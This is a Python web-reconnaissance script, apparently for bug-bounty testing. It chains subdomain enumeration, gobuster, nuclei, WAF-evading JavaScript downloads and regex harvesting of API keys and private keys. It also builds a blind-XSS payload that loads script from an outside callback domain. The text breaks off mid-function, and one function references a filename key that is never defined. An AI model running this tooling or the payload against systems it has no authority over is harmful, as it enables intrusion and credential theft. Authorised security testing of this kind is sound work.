#!/bin/env python3
import os
import json
import subprocess
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path
import tempfile
import shutil
import datetime
import re
import idna
import shlex
import time
import random
from typing import Optional, List, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, quote_plus, urlunparse, unquote
import sys
import requests
import urllib3 
import traceback
import hashlib
import dns.resolver
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ANSI color codes
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

extra_header = ""
headers = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/116.0.0.0 Safari/537.36"
    ),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

filenames = {
    "findomain": "{}.findomain.txt",
    "amass": "{}.amass.txt",
    "alive_subs" : "{}.alive_subs.txt",
    "gau" : "{}.gau.txt",
    "katana" : "{}.katana_results.txt",
    "unique_urls": "{}.unique_urls.txt",
    "alive_urls": "{}.alive_urls.txt",
    "sorted": "{}.sorted_urls.txt",
    "pretty_httpx": "{}.pretty_httpx.txt",
    "httpx_tech" : "{}.httpx_tech.txt",
    "sorted_urls" : "{}.sorted_urls.txt",

    "nuclei": "{}.nuclei_results.txt",
    "query_only": "{}.queries.txt",
    "xss_blind": "{}.blind_xss_urls.txt",
    "xss_payloads": "{}.xss_payloads.txt",
    "xss_results": "{}.xss_results.txt",
}

REDIRECT_CODES = {300,301,302,303,307,308}
SKIP_GOBUSTER = False

# Gobuster defaults (can be overridden via CLI)
GOBUSTER_WORDLIST = os.getenv("GOBUSTER_WORDLIST", "/usr/share/seclists/Discovery/Web-Content/common.txt")
GOBUSTER_PROXY: Optional[str] = None

# ENV variables
XSS_HUNTER_DOMAIN = os.getenv("XSS_HUNTER_DOMAIN", "")

KNOWN_TECHS = {
    "wordpress": {
        "nuclei_templates": "github/topscoder/nuclei-wordfence-cve",
        "nuclei_cves": "",
        "nuclei_tags": "wordpress"
    },
    "drupal": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "drupal"
    },
    "joomla": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "joomla"
    },
    "magento": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "magento"
    },
    "shopify": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "shopify"
    },
    "prestashop": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "prestashop"
    },
    "laravel": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "laravel"
    },
    "django": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "django"
    },
    "rails": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "rails"
    },
    "express": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "express"
    },
    "tomcat": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "tomcat"
    },
    "jboss": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "jboss"
    },
    "weblogic": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "weblogic"
    },
    "glassfish": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "glassfish"
    },
    "oracle": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "oracle"
    },
    "iis": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "iis"
    },
    "apache": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "apache"
    },
    "nginx": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "nginx"
    },
    "matomo": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "matomo"
    },
    "cisco": {
        "nuclei_templates": "",
        "nuclei_cves": "",
        "nuclei_tags": "cisco"
    }
}

def normalize_url(url: str) -> str:
    try:
        # Decode percent-encoded characters (e.g. %5C → \)
        url = unquote(url)

        # Replace all backslashes with forward slashes
        url = url.replace('\\', '/')

        # Parse the URL to isolate and clean the path
        parsed = urlparse(url)

        # Collapse multiple slashes in the path
        cleaned_path = re.sub(r'/+', '/', parsed.path)

        # Rebuild and return normalized URL
        normalized = urlunparse((
            parsed.scheme,
            parsed.netloc,
            cleaned_path,
            parsed.params,
            parsed.query,
            parsed.fragment
        ))

        return normalized
    except Exception as e:
        print(f"Error normalizing URL: {url} - {e}")
        return url

def enumerate_domains(pretty_httpx_file: Path, base_dir: Path, threads: int, proxy: Optional[str], wordlist: str):
    """Replicates enumerate_domains_2 bash logic in Python.

    pretty_httpx_file: path to pretty_httpx.txt produced earlier (first column is URL)
    base_dir: folder for the current wildcard domain processing (where gobuster_results/ will live)
    threads: gobuster thread count
    proxy: optional proxy URL (e.g. http://localhost:1340)
    wordlist: path to wordlist
    """
    output_folder = base_dir / "gobuster_results"
    output_folder.mkdir(exist_ok=True)

    if not pretty_httpx_file.exists():
        print(f"{Colors.WARNING}enumerate_domains: pretty_httpx file {pretty_httpx_file} missing, skipping{Colors.ENDC}")
        return

    # Extract first column (space-delimited) into list of URLs
    targets: List[str] = []
    seen = set()
    with pretty_httpx_file.open("r", errors="ignore") as f:
        for line in f:
            if not line.strip():
                continue
            url = line.split()[0]
            if url not in seen:
                seen.add(url)
                targets.append(url)

    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/116.0"

    for subdomain in targets:
        safe_subdomain = re.sub(r'^https?://', '', subdomain).replace('/', '_')
        output_file = output_folder / f"results_{safe_subdomain}.txt"
        if output_file.exists() and output_file.stat().st_size > 0:
            continue  # already scanned

        base_cmd = [
            "gobuster", "dir",
            "-u", subdomain,
            "-t", str(threads),
            "-w", wordlist,
            "-o", str(output_file),
            "-q", "-k", "-d",
            "-a", ua,
            "--delay", "3ms"
        ]
        if proxy:
            base_cmd.extend(["--proxy", proxy])
        if extra_header:
            base_cmd.extend(["-H", extra_header])

        print(f"{Colors.OKBLUE}{Colors.BOLD}Gobuster:{Colors.ENDC} {subdomain}")
        try:
            cp = subprocess.run(base_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
            if cp.returncode != 0:
                stderr = cp.stderr or ""
                # parse lengths from stderr
                lengths = sorted(set(re.findall(r'Length: (\d+)', stderr)))
                if lengths:
                    excl = ",".join(lengths)
                    print(f"{Colors.WARNING}Wildcard/length issue detected. Re-running excluding lengths: {excl}{Colors.ENDC}")
                    retry_cmd = base_cmd + ["--exclude-length", excl]
                    cp2 = subprocess.run(retry_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.PIPE, text=True)
                    if cp2.returncode != 0:
                        print(f"{Colors.FAIL}Gobuster failed again for {subdomain}: {cp2.stderr.strip()[:200]}{Colors.ENDC}")
                else:
                    print(f"{Colors.FAIL}Gobuster failed (no length hints) for {subdomain}: {stderr.strip()[:200]}{Colors.ENDC}")
            else:
                print(f"{Colors.OKGREEN}Gobuster complete: {subdomain}{Colors.ENDC}")
        except FileNotFoundError:
            print(f"{Colors.FAIL}Gobuster binary not found - skipping enumeration for {subdomain}{Colors.ENDC}")
            break
        except Exception as e:
            print(f"{Colors.FAIL}Gobuster exception for {subdomain}: {e}{Colors.ENDC}")

def sort_urls(input_file: Path, output_dir: Path):
    # Define patterns and associated output files
    extensions = {
        r"\.php[3-8]?(\?|$)": "php.txt",
        r"\.phtml(\?|$)": "php.txt",
        r"\.cfm(\?|$)": "cfm.txt",
        r"\.asp(\?|$)": "asp.txt",
        r"\.aspx(\?|$)": "asp.txt",
        r"\.asp\.net(\?|$)": "asp.txt",
        r"\.jsp(\?|$)": "jsp.txt",
        r"\.jspx(\?|$)": "jsp.txt",
        r"\.do(\?|$)": "do.txt",
        r"\.pl(\?|$)": "pl.txt",
        r"\.cgi(\?|$)": "cgi.txt",
        r"\.ashx(\?|$)": "ashx.txt",
        r"\.jsf(\?|$)": "jsf.txt",
        r"\.nsf(\?|$)": "nsf.txt",
        r"\.exe(\?|$)": "exe.txt",
        r"\.dll(\?|$)": "dll.txt",
        r"=http": "output_test_ssrf.txt",
        r"=/": "output_test_lfi.txt",
        r"/cgi-bin/": "cgibin.txt",
        r"\.json(ld)?(\?|$)": "json.txt",
        r"\.js(\?|$|#)": "js.txt",
        r"\.xml(\?|$)": "xml.txt",
        r"\.xhtml(\?|$)": "xml.txt",
        r"\.action(\?|$)": "action.txt",
        r"(?i)login": "login.txt",
        r"(?i)admin": "admin.txt",
        r"(?i)dashboard": "dashboard.txt",
        r"(?i)portal": "portal.txt",
        r"(?i)manage": "manage.txt",
        r"(?i)config": "config.txt",
        r"(?i)setup": "setup.txt",
        r"(?i)system": "system.txt",
        r"(?i)secure": "secure.txt",
        r"(?i)controlpanel": "controlpanel.txt",
        r"(?i)cpanel": "cpanel.txt",
        r"(?i)root": "root.txt",
        r"token": "token.txt",
        r"auth": "auth.txt",
        r"session": "session.txt",
        r"password": "password.txt",
        r"localhost|127\.0\.0\.1" : "localhost.txt",

    }

    # Create output directory
    output_dir.mkdir(parents=True, exist_ok=True)

    # Cleanup existing files
    for filename in set(extensions.values()):
        filepath = output_dir / filename
        if filepath.exists():
            filepath.unlink()

    # Open files for writing
    outputs = {
        pattern: open(output_dir / filename, "a", encoding="utf-8", errors="ignore")
        for pattern, filename in extensions.items()
    }

    # Read input and sort into buckets
    with open(input_file, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            for pattern, outfile in outputs.items():
                if re.search(pattern, line):
                    outfile.write(line)
                    break  # Avoid duplicates if multiple patterns match

    # Close all open file handles
    for outfile in outputs.values():
        outfile.close()

    # Remove empty files
    for file in output_dir.glob("*"):
        if file.stat().st_size == 0:
            file.unlink()

    # Generate index summary file
    index_file = output_dir.parent / "sorted_urls.txt"
    with open(index_file, "w", encoding="utf-8") as f:
        for file in sorted(output_dir.glob("*.txt")):
            f.write(f"{file.name} - {file.stat().st_size} bytes\n")

def unmap_with_sourcemapper(map_file: Path, output_dir: Path):
    """
    Uses sourcemapper to extract original JS sources from a .map file into output_dir.
    """
    if not map_file.exists():
        print(f"✗ Map file does not exist: {map_file}")
        return False

    output_dir.mkdir(parents=True, exist_ok=True)

    try:
        print(f"✓ Unmapping with sourcemapper: {map_file}")
        subprocess.run(
            ["sourcemapper", "-url", str(map_file), "-output", str(output_dir)],
            check=True,
            timeout=30
        )
        print(f"✓ Unmapped files written to: {output_dir}")
        return True
    except FileNotFoundError:
        print("✗ 'sourcemapper' is not installed. Install it with: go install github.com/denandz/sourcemapper@latest")
        return False
    except subprocess.CalledProcessError as e:
        print(f"✗ sourcemapper failed: {e}")
        return False
    except Exception as e:
        print(f"✗ Unexpected error during unmapping: {e}")
        return False

def analyze_js_files(domain_folder: Path, domain: str):
    js_dir = domain_folder / "js_analysis"
    js_dir.mkdir(exist_ok=True)

    js_urls = set()
    merged_urls_file = domain_folder / filenames["alive_urls"].format(domain)

    # Step 1: extract JS URLs
    if merged_urls_file.exists():
        with merged_urls_file.open("r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if ".js" in line and line.strip().startswith("http"):
                    js_urls.add(line.strip())

    # Step 2: download and analyze JS files
    secrets_found = {}
    endpoint_hits = {}

    downloaded_map_files = []

    patterns = {
        'google_api' : r'AIza[0-9A-Za-z-_]{35}',
        'docs_file_exetension' : r'^.*\.(xls|xlsx|doc|docx)$',
        #'bitcoin_address' : r'([13][a-km-zA-HJ-NP-Z0-9]{26,33})',
        'slack_api_key' : r'xox.-[0-9]{12}-[0-9]{12}-[0-9a-zA-Z]{24}',
        'us_cn_zipcode' : r'(^\d{5}(-\d{4})?$)|(^[ABCEGHJKLMNPRSTVXY]{1}\d{1}[A-Z]{1} *\d{1}[A-Z]{1}\d{1}$)',
        'google_cloud_platform_auth' : r'[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}',
        'google_cloud_platform_api' : r'[A-Za-z0-9_]{21}--[A-Za-z0-9_]{8}',
        #'amazon_secret_key' : r'[0-9a-zA-Z/+]{40}',
        'gmail_auth_token': r'[0-9A-Za-z_-]{32}\.apps\.googleusercontent\.com',
        'github_auth_token' : r'[0-9a-fA-F]{40}',
        'Instagram_token' : r'[0-9a-fA-F]{7}.[0-9a-fA-F]{32}',
        'twitter_access_token': r'[1-9][0-9]+-[0-9a-zA-Z]{40}',
        'firebase' : r'AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}',
        #'google_captcha' : r'6L[0-9A-Za-z-_]{38}|^6[0-9a-zA-Z_-]{39}$',
        'google_oauth' : r'ya29\.[0-9A-Za-z\-_]+',
        'amazon_aws_access_key_id' : r'A[SK]IA[0-9A-Z]{16}',
        'amazon_mws_auth_toke' : r'amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}',
        'amazon_aws_url' : r's3\.amazonaws.com[/]+|[a-zA-Z0-9_-]*\.s3\.amazonaws.com',
        'facebook_access_token' : r'EAACEdEose0cBA[0-9A-Za-z]+',
        'authorization_basic' : r'basic\s*[a-zA-Z0-9=:_\+\/-]+',
        'authorization_bearer' : r'bearer\s*[a-zA-Z0-9_\-\.=:_\+\/]+',
        'authorization_api' : r'api[key|\s*]+[a-zA-Z0-9_\-]+',
        'mailgun_api_key' : r'key-[0-9a-zA-Z]{32}',
        'twilio_api_key' : r'SK[0-9a-fA-F]{32}',
        #'twilio_account_sid' : r'AC[a-zA-Z0-9_\-]{32}',
        #'twilio_app_sid' : r'AP[a-zA-Z0-9_\-]{32}',
        'paypal_braintree_access_token' : r'access_token\$production\$[0-9a-z]{16}\$[0-9a-f]{32}',
        'square_oauth_secret': r'sq0csp-[0-9A-Za-z\-_]{43}|sq0[a-z]{3}-[0-9A-Za-z\-_]{22,43}',
        'square_access_token' : r'sqOatp-[0-9A-Za-z\-_]{22}|EAAA[a-zA-Z0-9]{60}',
        'stripe_standard_api' : r'sk_live_[0-9a-zA-Z]{24}',
        'stripe_restricted_api' : r'rk_live_[0-9a-zA-Z]{24}',
        'github_access_token' : r'[a-zA-Z0-9_-]*:[a-zA-Z0-9_\-]+@github\.com*',
        'rsa_private_key' : r'-----BEGIN RSA PRIVATE KEY-----',
        'ssh_dsa_private_key' : r'-----BEGIN DSA PRIVATE KEY-----',
        'ssh_dc_private_key' : r'-----BEGIN EC PRIVATE KEY-----',
        'pgp_private_block' : r'-----BEGIN PGP PRIVATE KEY BLOCK-----',
        'json_web_token' : r'ey[I|J][A-Za-z0-9_-]*\.[A-Za-z0-9._-]*|ey[A-Za-z0-9_/+-]*\.[A-Za-z0-9._/+-]*',
        # Wildcard patterns
        # 'admin_keyword' : r'admin[a-zA-Z0-9_\-]*',
        # 'token_keyword' : r'token[a-zA-Z0-9_\-]*',
        # 'password_keyword' : r'passw(or)?d[a-zA-Z0-9_\-]*',
        # 'apikey_keyword' : r'api[_-]?key[a-zA-Z0-9_\-]*',
        'localhost_url' : r'localhost(:[0-9]{1,5})?',
        'emails' : r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
    }

    # URL_REGEX = r'(?<=(["\'`]))(?:https?:\/\/|\/|\.{1,2}\/)[^\s"\'`<>\\]+(?=\1)'
    URL_REGEX = r'["\']((?:https?://[\w\-./?=#&%]+)|(?:(?:\.\.?/|/)?[\w\-./]+\.[a-zA-Z]{2,6}(?:\?[\w\-./?=#&%]*)?)|(?:(?:\.\.?/|/)[\w\-./]+))["\']'

    # Set of known false-positive patterns to ignore
    BLOCKLIST_PATTERNS = [
        r'^/?1999/',
        r'^/?2000/',
        r'^/?AppleWebKit/',
        r'^/?Firefox/',
        r'^/?px/',
        r'^/?533/',
        r'^/?errors/',
        r'/dot/g',
        r'/contrast/g',
        r'^//$'
    ]

    suspicious_js_keywords = ["app", "main", "bundle", "min", "build", "vue", "react", "angular"]

    IGNORE_JS_FILES= [
        r"jquery[-\d\.]*\.js",
        r"jquery[-\d\.]*\.min.js",
        r"bootstrap[-\d\.]*\.js",
        r"bootstrap[-\d\.]*\.min\.js",
        r"purify\.js",
        r"purify\.min\.js",
        r"favico\.min\.js"
    ]

    md5_ignore = set()

    for idx, url in enumerate(js_urls):
        
        print(f'{Colors.OKBLUE}Analyzing JS URL:{Colors.ENDC} {url}')
        filename = js_dir / f"{idx}_{url.split('/')[-1].split('?')[0]}"
        
        if any(re.fullmatch(ign, filename.name, re.IGNORECASE) for ign in IGNORE_JS_FILES):
            with open('ignored_js_files.txt', 'ab') as f:
                f.write((f"{url}\n").encode())
            continue

        try:
            time.sleep(0.1 + random.uniform(0, 0.3)) # Sleep to avoid waf 
            
            r = requests.get(url, headers={"User-Agent": "Mozilla/5.0", extra_header.split(':')[0]: extra_header.split(':')[1][1:]}, timeout=4, verify=False)
            if r.status_code != 200:
                print(f"  ↳ Skipping, HTTP status {r.status_code}")
                continue
            
            file_hash = hashlib.md5(r.content).hexdigest()
            if file_hash in md5_ignore:
                print(f"  ↳ Skipping, duplicate content (MD5: {file_hash})")
                continue
            md5_ignore.add(file_hash)
            
            def isHtml(r):
                if re.match(r'(?i)^\s*<!DOCTYPE|<html', r.text, re.I):
                    return True
                return False
            
            if isHtml(r):
                print("  ↳ Skipping, looks like HTML content")
                continue

            with open(filename, "wb") as f:
                f.write(f"// Source: {url}\n".encode())
                f.write(r.content)

            content = r.text

            # Check for explicit sourcemap comment
            map_urls_to_try = []
            source_map_match = re.search(r'//# sourceMappingURL=(.*\.map)', content)
            if source_map_match:
                map_urls_to_try.append(urljoin(url, source_map_match.group(1).strip()))
            
            # Rewrite snippet above because it doesnt work
            parsed = urlparse(url)
            if any(k in parsed.path.lower() for k in suspicious_js_keywords):
                guessed_map_url = url + ".map" if not parsed.path.lower().endswith(".map") else url
                map_urls_to_try.append(guessed_map_url)

            for murl in set(map_urls_to_try):
                map_filename = filename.with_suffix(filename.suffix + ".map")
                try:
                    print(f"  ↳ Attempting to download sourcemap: {murl}")

                    mr = requests.get(murl, headers={"User-Agent": "Mozilla/5.0", extra_header.split(':')[0]: extra_header.split(':')[1][1:] }, timeout=4, verify=False)
                    if mr.status_code == 200 and not isHtml(mr):
                        with open(map_filename, "wb") as mf:
                            mf.write(mr.content)
                        print(f"{Colors.OKGREEN}{Colors.UNDERLINE}  ↳ Downloaded sourcemap to: {map_filename}{Colors.ENDC}")
                    else:
                        print(f"  ↳ Failed to download sourcemap, HTTP status {mr.status_code}")
                        continue
                    if map_filename.exists() and map_filename.stat().st_size > 0:
                        downloaded_map_files.append(map_filename)

                except subprocess.SubprocessError:
                    print(f"  ↳ Failed to download .map: {murl}")


            file_hits = {}
            for name, regex in patterns.items():
                matches = re.findall(regex, content, flags=re.I)
                if matches:
                    file_hits[name] = list(set(matches))

            if file_hits:
                secrets_found[url] = file_hits

            # Optional: save extracted paths (very LinkFinder-lite)
            endpoints = set()
            for match in re.findall(URL_REGEX, content):
                # Apply blocklist filtering
                if any(re.search(bp, match) for bp in BLOCKLIST_PATTERNS):
                    continue
                endpoints.add(match)
                
            if endpoints:
                endpoint_hits[url] = list(endpoints)

        except subprocess.SubprocessError as e:
            # Print error stack trace
            print(f"  ↳ Error downloading or processing JS: {e}")
            continue  # skip failed downloads silently
        except Exception as e:
            print(f"  ↳ Unexpected error: {e}")
            continue

    n_success_mapped_files = 0
    
    # Attempt to unmap downloaded .map files
    for map_filename in downloaded_map_files:
        if map_filename.exists():
            unmap_output_dir = js_dir / f"unmapped_{map_filename.name}"
            if unmap_with_sourcemapper(map_filename, unmap_output_dir):
                n_success_mapped_files += 1
    
    # Save raw output if any found
    if secrets_found or endpoint_hits:
        with (js_dir / "secrets.json").open("w") as f:
            json.dump(secrets_found, f, indent=2)
        with (js_dir / "endpoints.json").open("w") as f:
            json.dump(endpoint_hits, f, indent=2)

    # Check if js_analysis dir has any files - if not, remove it
    if js_dir.exists() and not any(js_dir.iterdir()):
        js_dir.rmdir()

    return {
        "js_urls_checked": len(js_urls),
        "secrets_found": len(secrets_found),
        "endpoints_extracted": len(endpoint_hits),
        "dir": js_dir if (secrets_found or endpoint_hits) else None,
        "sourcemaps_downloaded": n_success_mapped_files
    }

def run_cmd(cmd, cwd=None, stdout_file=None, allow_empty_stdout=True, timeout=None):
    print(f"{Colors.OKBLUE}{Colors.BOLD}Running:{Colors.ENDC} {Colors.OKCYAN}{cmd}{Colors.ENDC}")
    with subprocess.Popen(
        cmd,
        shell=True,
        cwd=cwd,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        bufsize=1
    ) as process:
        wrote_output = False
        if stdout_file:
            with open(Path(cwd or ".") / stdout_file, "w") as f:
                for line in process.stdout:
                    f.write(line)
                    wrote_output = True
        else:
            for line in process.stdout:
                print(f"{Colors.OKGREEN}{line.rstrip()}{Colors.ENDC}")
                wrote_output = True
        try:
            process.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            process.kill()
            raise RuntimeError(f"Timeout: {cmd}")
        if process.returncode != 0:
            raise RuntimeError(f"Command failed ({process.returncode}): {cmd}")
        if not wrote_output and not allow_empty_stdout:
            raise RuntimeError(f"No stdout produced by: {cmd}")

def hdr():
    return f" -H {shlex.quote(extra_header)}" if extra_header else ""

def findomain_scan(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Starting Findomain scan for {domain}{Colors.ENDC}")
    findomain_file = filenames['findomain'].format(domain)
    if not (folder / findomain_file).exists():
        try:
            run_cmd(f"findomain -t {domain} -u {findomain_file}", cwd=folder, allow_empty_stdout=True)
            if (folder / findomain_file).exists() and (folder / findomain_file).stat().st_size > 0:
                print(f"{Colors.OKGREEN}findomain_scan: Found subdomains, saved to {findomain_file}{Colors.ENDC}")
                return findomain_file
            else:
                print(f"{Colors.WARNING}findomain_scan: No subdomains found for {domain}{Colors.ENDC}")
                return
        except RuntimeError as e:
            print(f"{Colors.FAIL}findomain_scan: Error running findomain: {e}{Colors.ENDC}")
            return
    else:
        print(f"{Colors.OKGREEN}findomain_scan: {findomain_file} already exists, skipping scan{Colors.ENDC}")
        return findomain_file

def amass_scan(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Starting Amass scan for {domain}{Colors.ENDC}")
    amass_file = filenames['amass'].format(domain)
    if not (folder / amass_file).exists():
        try:
            run_cmd(f"amass enum -d {domain} -o {amass_file} -passive", cwd=folder, allow_empty_stdout=True)
            if (folder / amass_file).exists() and (folder / amass_file).stat().st_size > 0:
                print(f"{Colors.OKGREEN}amass_scan: Found subdomains, saved to {amass_file}{Colors.ENDC}")
                return amass_file
            else:
                print(f"{Colors.WARNING}amass_scan: No subdomains found for {domain}{Colors.ENDC}")
                return
        except RuntimeError as e:
            print(f"{Colors.FAIL}amass_scan: Error running amass: {e}{Colors.ENDC}")
            return
    else:
        print(f"{Colors.OKGREEN}amass_scan: {amass_file} already exists, skipping scan{Colors.ENDC}")
        return amass_file

def merge_subdomains(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Merging subdomain files for {domain}{Colors.ENDC}")
    findomain_file = filenames['findomain'].format(domain)
    amass_file = filenames['amass'].format(domain)
    merged_file = filenames['merged_subdomains'].format(domain)

    if not (folder / merged_file).exists():
        existing_files = []
        if (folder / findomain_file).exists():
            existing_files.append(findomain_file)

        if (folder / amass_file).exists():
            existing_files.append(amass_file)

        if existing_files == []:
            print(f"{Colors.WARNING}merge_subdomains: No input files found ({findomain_file}, {amass_file}), skipping{Colors.ENDC}")
            return
        
        run_cmd(f"cat {' '.join(existing_files)} | sort -u | dnsx -silent -a -o {merged_file}", cwd=folder, allow_empty_stdout=True)

        print(f"{Colors.OKGREEN}merge_subdomains: Merged {existing_files} unique subdomains into {merged_file}{Colors.ENDC}")
        return merged_file
    else:
        print(f"{Colors.OKGREEN}merge_subdomains: {merged_file} already exists, skipping merge{Colors.ENDC}")
        return merged_file

def merge_httpx_files(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Merging HTTPX files for {domain}{Colors.ENDC}")
    gau_file = filenames['gau'].format(domain)
    katana_file = filenames['katana'].format(domain)
    unique_urls_file = filenames['unique_urls'].format(domain)
    alive_urls_file = filenames['alive_urls'].format(domain)
    
    def process_line(line):
        line = normalize_url(line)
        path = line.split("?")[0].strip()
        if path not in seen:
            seen.add(path)
            try:
                parsed = urlparse(line)
                host = parsed.hostname or ""
                if host.endswith(domain):
                    return line.strip()
                
            except Exception:
                print(f"{Colors.WARNING}Invalid URL skipped: {line.strip()}{Colors.ENDC}")

    seen = set()
    if not (folder / gau_file).exists() and not (folder / katana_file).exists():
        print(f"{Colors.WARNING}merge_httpx_files: No input files found ({gau_file}, {katana_file}), skipping{Colors.ENDC}")
        return
    if not (folder / unique_urls_file).exists():
        if (folder / gau_file).exists():
            with (folder / gau_file).open('r', errors="ignore") as fg:
                for line in fg:
                    processed = process_line(line)
                    if processed:
                        seen.add(processed)
        if (folder / katana_file).exists():
            with (folder / katana_file).open('r', errors="ignore") as fk:
                for line in fk:
                    processed = process_line(line)
                    if processed:
                        seen.add(processed)
        with (folder / unique_urls_file).open('w') as fu:
            for url in seen:
                fu.write(url + "\n")
        print(f"{Colors.OKGREEN}merge_httpx_files: Merged {len(seen)} unique URLs into {unique_urls_file}{Colors.ENDC}")
    else:
        print(f"{Colors.OKGREEN}merge_httpx_files: {unique_urls_file} already exists, skipping merge{Colors.ENDC}")
    
    if not (folder / alive_urls_file).exists():
        if (folder / unique_urls_file).exists():
            alive_cmd = f"httpx -rate-limit 4 -o {alive_urls_file}{hdr()}"
            run_cmd(f"cat {unique_urls_file} | {alive_cmd}", cwd=folder, allow_empty_stdout=True)
            print(f"{Colors.OKGREEN}merge_httpx_files: Created alive URLs file {alive_urls_file}{Colors.ENDC}")
            return alive_urls_file
        else:
            print(f"{Colors.WARNING}merge_httpx_files: {unique_urls_file} missing, cannot create {alive_urls_file}{Colors.ENDC}")

def nuclei_scan(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Starting nuclei scan for {domain}{Colors.ENDC}")
    nuclei_file = filenames['nuclei'].format(domain)
    pretty_httpx_file = filenames['pretty_httpx'].format(domain)

    if not (folder / pretty_httpx_file).exists():
        print(f"{Colors.WARNING}nuclei_scan: pretty_httpx file {pretty_httpx_file} missing, skipping{Colors.ENDC}")
        return

    techs = set()
    targets: List[str] = []
    seen = set()

    if (folder / pretty_httpx_file).stat().st_size > 0 and not (folder / nuclei_file).exists():
        with (folder / pretty_httpx_file).open("r", errors="ignore") as f:
            for line in f:
                if not line.strip():
                    continue
                url = line.split()[0]
                if url not in seen:
                    seen.add(url)
                    targets.append(url)

                tech_matches = re.findall(r"\[.+?\]", line)
                for tech in KNOWN_TECHS:
                    for attempt_tech in tech_matches:
                        if tech.lower() in attempt_tech.lower():
                            techs.add(tech)
                            
        if techs:
            nuclei_tags = f",".join(KNOWN_TECHS[tech]['nuclei_tags'] for tech in techs)
            nuclei_templates = ','.join(KNOWN_TECHS[tech]['nuclei_templates'] for tech in techs)

            # TODO: implement nuclei cve's and other options
            print(f"{Colors.OKBLUE}{Colors.BOLD}Nuclei scan for {url} with techs: {', '.join(techs)}{Colors.ENDC}")
            nuclei_urls = ",".join(f"{url}" for url in targets)
            nuclei_command = f"nuclei -u {nuclei_urls} -o {nuclei_file} --tags default,{nuclei_tags} --templates {nuclei_templates}{hdr()}"
            print(nuclei_command)
            run_cmd(nuclei_command, cwd=folder, allow_empty_stdout=True)
            return nuclei_file

        else:
            print(f"{Colors.WARNING}No known techs detected for nuclei scan on {url}{Colors.ENDC}")
            return

def create_query_only_file(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Creating query-only URL file for {domain}{Colors.ENDC}")
    input_file = filenames['alive_urls'].format(domain)
    output_file = filenames['query_only'].format(domain)

    if not (folder / input_file).exists():
        print(f"{Colors.WARNING}create_query_only_file: input file {input_file} missing, skipping{Colors.ENDC}")
        return

    seen = set()
    with (folder / input_file).open("r", errors="ignore") as fin, (folder / output_file).open("w") as fout:
        for line in fin:
            url = line.strip().split()[0]
            if url and "=" in url and url not in seen:
                seen.add(url)
                fout.write(url + "\n")

    if (folder / output_file).stat().st_size == 0:
        (folder / output_file).unlink()
        print(f"{Colors.WARNING}create_query_only_file: No injectable URLs found in {input_file}, skipping creation of {output_file}{Colors.ENDC}")
    else:
        print(f"{Colors.OKGREEN}create_query_only_file: Created {output_file} with {len(seen)} injectable URLs{Colors.ENDC}")
    return output_file

def xss_scan(folder: Path, domain: str):
    print(f"{Colors.HEADER}{Colors.BOLD}Starting XSS scan for {domain}{Colors.ENDC}")
    output_file = filenames['xss_results'].format(domain)
    blind_file = filenames['xss_blind'].format(domain)
    alive_query_file = filenames['query_only'].format(domain)

    if not XSS_HUNTER_DOMAIN:
        print(f"{Colors.WARNING}xss_scan: XSS_HUNTER_DOMAIN not set, skipping{Colors.ENDC}")
        return

    xss_hunter_payload = f"<script src='https://{XSS_HUNTER_DOMAIN}/abc.js'></script>"

    if not (folder / alive_query_file).exists():
